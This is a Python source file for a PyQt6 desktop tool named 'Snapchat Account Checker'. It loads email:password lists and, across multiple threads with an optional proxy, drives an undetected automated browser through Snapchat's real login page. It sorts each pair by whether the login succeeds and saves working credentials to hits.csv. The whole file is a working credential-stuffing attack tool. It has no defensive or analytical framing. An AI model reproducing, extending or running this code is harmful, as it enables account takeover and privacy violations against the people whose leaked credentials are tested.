import csv
import os
import sys
import time
import threading
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, Future
from pathlib import Path

from dotenv import load_dotenv
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QFileDialog,
    QTextEdit, QProgressBar, QSpinBox, QGroupBox, QMessageBox
)
from PyQt6.QtCore import QThread, pyqtSignal, QObject
from PyQt6.QtGui import QFont

load_dotenv()

URL = "https://accounts.snapchat.com/v2/login"
ACCOUNTS_FILE = "accounts.txt"
RUNS_DIR = Path(__file__).parent / "runs"


# ─── Signals bridge for thread-safe GUI updates ───────────────────────────────

class LogSignal(QObject):
    log = pyqtSignal(str, str)          # message, level
    progress = pyqtSignal(int, int)     # current, total
    account_done = pyqtSignal(int, str, str)  # row, status, detail
    finished = pyqtSignal()
    error = pyqtSignal(str)


# ─── Worker thread ────────────────────────────────────────────────────────────

class CheckerWorker(QThread):
    log_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int, int)
    account_done_signal = pyqtSignal(int, str, str)
    finished_signal = pyqtSignal()
    error_signal = pyqtSignal(str)

    def __init__(self, accounts, proxy, max_threads, run_dir, logger):
        super().__init__()
        self.accounts = accounts
        self.proxy = proxy
        self.max_threads = max_threads
        self.run_dir = run_dir
        self.logger = logger
        self._stop = False
        self._lock = threading.Lock()
        self._counter = 0

    def stop(self):
        self._stop = True

    def run(self):
        hits_path = self.run_dir / "hits.csv"
        non_hits_path = self.run_dir / "non_hits.csv"
        csv_lock = threading.Lock()

        def append_csv(path, email, password):
            with csv_lock:
                with open(path, "a", newline="") as f:
                    csv.writer(f).writerow([email, password])

        total = len(self.accounts)

        def process(account_info):
            if self._stop:
                return
            row_idx = account_info["row"]
            account = account_info["data"]

            with self._lock:
                self._counter += 1
                current = self._counter

            self.progress_signal.emit(current, total)
            self.log_signal.emit(
                f"[{current}/{total}] Checking: {account['email']}", "INFO"
            )
            self.logger.info(f"Checking: {account['email']}")

            MAX_RETRIES = 3
            status = "ERROR"
            detail = ""

            for attempt in range(1, MAX_RETRIES + 1):
                if self._stop:
                    break
                try:
                    from seleniumbase import SB

                    sb_kwargs = {"uc": True, "test": False}
                    if self.proxy:
                        sb_kwargs["proxy"] = self.proxy

                    with SB(**sb_kwargs) as sb:
                        sb.activate_cdp_mode(URL)
                        sb.sleep(5)

                        sb.type('input[name="accountIdentifier"]', account["email"], timeout=20)
                        sb.click('button[type="submit"]')
                        sb.sleep(4)

                        if not sb.is_element_visible('input[name="password"]', timeout=5):
                            status = "NON-HIT"
                            detail = "email not valid (no password page)"
                            self.log_signal.emit(
                                f"  -> [NON-HIT] {account['email']} - {detail}", "NONHIT"
                            )
                            self.logger.info(f"[NON-HIT] {account['email']} - {detail}")
                            append_csv(non_hits_path, account["email"], account["password"])
                            break

                        sb.type('input[name="password"]', account["password"], timeout=5)
                        sb.click('button[data-testid="password-submit-button"]')
                        sb.sleep(4)

                        current_url = sb.get_current_url()

                        if "accounts/v2" in current_url or "otp" in current_url or "welcome" in current_url:
                            status = "HIT"
                            detail = "logged in"
                            self.log_signal.emit(
                                f"  -> [HIT] {account['email']} - {detail}", "HIT"
                            )
                            self.logger.info(f"[HIT] {account['email']} - {detail}")
                            append_csv(hits_path, account["email"], account["password"])
                        else:
                            status = "NON-HIT"
                            detail = "not logged in"
                            self.log_signal.emit(
                                f"  -> [NON-HIT] {account['email']} - {detail}", "NONHIT"
                            )
                            self.logger.info(f"[NON-HIT] {account['email']} - {detail}")
                            append_csv(non_hits_path, account["email"], account["password"])
                        break

                except Exception as e:
                    status = "ERROR"
                    detail = str(e)
                    if attempt < MAX_RETRIES:
                        self.log_signal.emit(
                            f"  -> [ERROR] {account['email']} - {detail} (retry {attempt}/{MAX_RETRIES})", "ERROR"
                        )
                        self.logger.error(f"[ERROR] {account['email']} - {detail} (retry {attempt}/{MAX_RETRIES})")
                        time.sleep(2)
                    else:
                        self.log_signal.emit(
                            f"  -> [ERROR] {account['email']} - {detail} (failed after {MAX_RETRIES} attempts)", "ERROR"
                        )
                        self.logger.error(f"[ERROR] {account['email']} - {detail} (failed after {MAX_RETRIES} attempts)")

            self.account_done_signal.emit(row_idx, status, detail)

        try:
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(process, a) for a in self.accounts]
                for f in futures:
                    if self._stop:
                        break
                    f.result()
        except Exception as e:
            self.error_signal.emit(str(e))
            self.logger.error(f"Worker thread error: {e}")
        finally:
            self.finished_signal.emit()


# ─── Main GUI ─────────────────────────────────────────────────────────────────

class SnapchatCheckerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Snapchat Account Checker")
        self.setMinimumSize(1000, 700)
        self.accounts = []          # list of dicts: {email, password}
        self.results = {}           # {row_index: status}
        self.file_path = None
        self.worker = None
        self.run_dir = None
        self.logger = None

        self._build_ui()
        self._load_env_settings()

    # ── UI construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)

        # --- Top controls ---
        top = QHBoxLayout()

        self.btn_upload = QPushButton("Upload File")
        self.btn_upload.clicked.connect(self.upload_file)
        top.addWidget(self.btn_upload)

        self.lbl_file = QLabel("No file selected")
        top.addWidget(self.lbl_file, 1)

        self.lbl_count = QLabel("Accounts: 0")
        top.addWidget(self.lbl_count)

        layout.addLayout(top)

        # --- Format hint ---
        self.lbl_format = QLabel("Format: email:password  (one per line, # lines skipped)")
        self.lbl_format.setStyleSheet("color: #888888; font-style: italic;")
        layout.addWidget(self.lbl_format)

        # --- Settings group ---
        settings_group = QGroupBox("Settings")
        settings_layout = QHBoxLayout(settings_group)

        settings_layout.addWidget(QLabel("Threads:"))
        self.spin_threads = QSpinBox()
        self.spin_threads.setMinimum(1)
        self.spin_threads.setMaximum(10)
        self.spin_threads.setValue(2)
        settings_layout.addWidget(self.spin_threads)

        settings_layout.addWidget(QLabel("Max Accounts (0=all):"))
        self.spin_max = QSpinBox()
        self.spin_max.setMinimum(0)
        self.spin_max.setMaximum(99999)
        self.spin_max.setValue(0)
        settings_layout.addWidget(self.spin_max)

        settings_layout.addStretch()

        self.btn_start = QPushButton("Start")
        self.btn_start.clicked.connect(self.start_checking)
        self.btn_start.setEnabled(False)
        settings_layout.addWidget(self.btn_start)

        self.btn_stop = QPushButton("Stop")
        self.btn_stop.clicked.connect(self.stop_checking)
        self.btn_stop.setEnabled(False)
        settings_layout.addWidget(self.btn_stop)

        layout.addWidget(settings_group)

        # --- Log panel ---
        log_group = QGroupBox("Log")
        log_layout = QVBoxLayout(log_group)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setFont(QFont("Menlo", 11))
        log_layout.addWidget(self.log_text)

        btn_clear_log = QPushButton("Clear Log")
        btn_clear_log.clicked.connect(self.log_text.clear)
        log_layout.addWidget(btn_clear_log)

        layout.addWidget(log_group, 1)

        # --- Progress bar ---
        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout.addWidget(self.progress)

    # ── Env settings ──────────────────────────────────────────────────────────

    def _load_env_settings(self):
        self.proxy = os.getenv("PROXY", "").strip()
        max_threads_env = int(os.getenv("MAX_THREADS", "2"))
        max_accounts_env = int(os.getenv("MAX_ACCOUNTS", "0"))
        self.spin_threads.setValue(max_threads_env)
        self.spin_max.setValue(max_accounts_env)

    # ── File upload ───────────────────────────────────────────────────────────

    def upload_file(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select accounts file", "", "Text files (*.txt);;All files (*.*)"
        )
        if not path:
            return

        self.file_path = path
        self.lbl_file.setText(os.path.basename(path))
        self._load_accounts()

    def _load_accounts(self):
        self.accounts = []
        self.results = {}

        try:
            with open(self.file_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" not in line:
                        continue
                    email, password = line.split(":", 1)
                    self.accounts.append({
                        "email": email.strip(),
                        "password": password.strip()
                    })
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to read file:\n{e}")
            return

        max_accts = self.spin_max.value()
        if max_accts > 0:
            self.accounts = self.accounts[:max_accts]

        self.lbl_count.setText(f"Total accounts found: {len(self.accounts)}")
        self.btn_start.setEnabled(len(self.accounts) > 0)

    # ── Logging setup ─────────────────────────────────────────────────────────

    def _setup_run_logger(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.run_dir = RUNS_DIR / f"run_{timestamp}"
        self.run_dir.mkdir(parents=True, exist_ok=True)

        log_file = self.run_dir / "run.log"
        logger = logging.getLogger(f"run_{timestamp}")
        logger.setLevel(logging.DEBUG)
        logger.handlers.clear()

        fh = logging.FileHandler(log_file, encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(
            "%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
        ))
        logger.addHandler(fh)

        # Write header
        logger.info(f"=== Run started: {timestamp} ===")
        logger.info(f"Accounts to process: {len(self.accounts)}")
        logger.info(f"Threads: {self.spin_threads.value()}")
        logger.info(f"Proxy: {self.proxy if self.proxy else 'None'}")
        logger.info(f"File: {self.file_path}")

        # Create empty CSV files with headers
        for name in ("hits.csv", "non_hits.csv"):
            with open(self.run_dir / name, "w", newline="") as f:
                csv.writer(f).writerow(["email", "password"])

        self.logger = logger
        return self.run_dir

    # ── Start / Stop ──────────────────────────────────────────────────────────

    def start_checking(self):
        if not self.accounts:
            QMessageBox.warning(self, "Warning", "No accounts loaded.")
            return

        run_dir = self._setup_run_logger()
        self.log_text.clear()
        self._log(f"=== Run started: {run_dir.name} ===", "INFO")
        self._log(f"Output directory: {run_dir}", "INFO")
        if self.proxy:
            self._log(f"Proxy: {self.proxy}", "HIT")
        else:
            self._log("Proxy: None", "INFO")
        self._log(f"Accounts: {len(self.accounts)}  Threads: {self.spin_threads.value()}", "INFO")
        self._log("", "INFO")

        self.progress.setValue(0)
        self.progress.setMaximum(len(self.accounts))
        self.btn_start.setEnabled(False)
        self.btn_upload.setEnabled(False)
        self.btn_stop.setEnabled(True)

        accounts_data = [
            {"row": i, "data": acct}
            for i, acct in enumerate(self.accounts)
        ]

        self.worker = CheckerWorker(
            accounts=accounts_data,
            proxy=self.proxy,
            max_threads=self.spin_threads.value(),
            run_dir=run_dir,
            logger=self.logger,
        )
        self.worker.log_signal.connect(self.on_log)
        self.worker.progress_signal.connect(self.on_progress)
        self.worker.account_done_signal.connect(self.on_account_done)
        self.worker.finished_signal.connect(self.on_finished)
        self.worker.error_signal.connect(self.on_error)
        self.worker.start()

    def stop_checking(self):
        if self.worker and self.worker.isRunning():
            self._log("Stopping... (will finish current tasks)", "WARN")
            self.worker.stop()
            self.btn_stop.setEnabled(False)

    # ── Worker callbacks ──────────────────────────────────────────────────────

    def on_log(self, msg, level):
        self._log(msg, level)

    def on_progress(self, current, total):
        self.progress.setValue(current)

    def on_account_done(self, row, status, detail):
        self.results[row] = status
        if status in ("HIT", "NON-HIT"):
            self._remove_account_from_file(row)

    def on_finished(self):
        self._log("", "INFO")
        self._log(f"=== Run complete ===", "INFO")
        self._log(f"Results saved to: {self.run_dir}", "INFO")

        hits = sum(1 for s in self.results.values() if s == "HIT")
        non_hits = sum(1 for s in self.results.values() if s in ("NON-HIT", "ERROR"))
        self._log(f"Hits: {hits}  |  Non-hits: {non_hits}", "INFO")

        if self.logger:
            self.logger.info(f"=== Run complete: Hits={hits}, Non-hits={non_hits} ===")

        self.btn_start.setEnabled(True)
        self.btn_upload.setEnabled(True)
        self.btn_stop.setEnabled(False)

    def on_error(self, msg):
        self._log(f"[FATAL ERROR] {msg}", "ERROR")
        if self.logger:
            self.logger.error(f"Fatal: {msg}")
        QMessageBox.critical(self, "Error", msg)
        self.btn_start.setEnabled(True)
        self.btn_upload.setEnabled(True)
        self.btn_stop.setEnabled(False)

    # ── Remove single account from file ───────────────────────────────────────

    _file_lock = threading.Lock()

    def _remove_account_from_file(self, row):
        if not self.file_path or row >= len(self.accounts):
            return
        email = self.accounts[row]["email"]
        try:
            with self._file_lock:
                with open(self.file_path, "r") as f:
                    lines = f.readlines()

                remaining = []
                removed = False
                for line in lines:
                    stripped = line.strip()
                    if not stripped or stripped.startswith("#"):
                        remaining.append(line)
                        continue
                    line_email = stripped.split(":", 1)[0].strip() if ":" in stripped else stripped
                    if line_email == email and not removed:
                        removed = True
                        continue
                    remaining.append(line)

                if removed:
                    with open(self.file_path, "w") as f:
                        f.writelines(remaining)
                    self._log(f"  -> Removed {email} from file.", "INFO")
                    if self.logger:
                        self.logger.info(f"Removed {email} from {self.file_path}")
        except Exception as e:
            self._log(f"  -> Failed to remove {email} from file: {e}", "ERROR")
            if self.logger:
                self.logger.error(f"Failed to remove {email}: {e}")

    # ── Log helper ────────────────────────────────────────────────────────────

    def _log(self, msg, level="INFO"):
        color_map = {
            "INFO": "#cccccc",
            "HIT": "#27ae60",
            "NONHIT": "#e74c3c",
            "ERROR": "#f39c12",
            "WARN": "#f1c40f",
        }
        color = color_map.get(level, "#cccccc")
        self.log_text.append(f'<span style="color:{color};">{msg}</span>')


# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = SnapchatCheckerGUI()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
